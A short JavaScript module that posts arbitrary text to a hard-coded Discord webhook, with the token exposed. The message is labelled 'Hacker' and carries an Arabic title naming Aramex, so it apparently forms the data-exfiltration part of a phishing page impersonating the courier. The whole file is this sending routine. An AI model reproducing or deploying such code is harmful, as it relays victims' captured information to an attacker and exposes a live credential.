import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323609252824088617/CCsle-KIppQ1_BKFAkyfqz-Fac7NjiHOxOd2Pl7v7wXz9yg7_YQRIc1ziscb1u_dVDp_",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
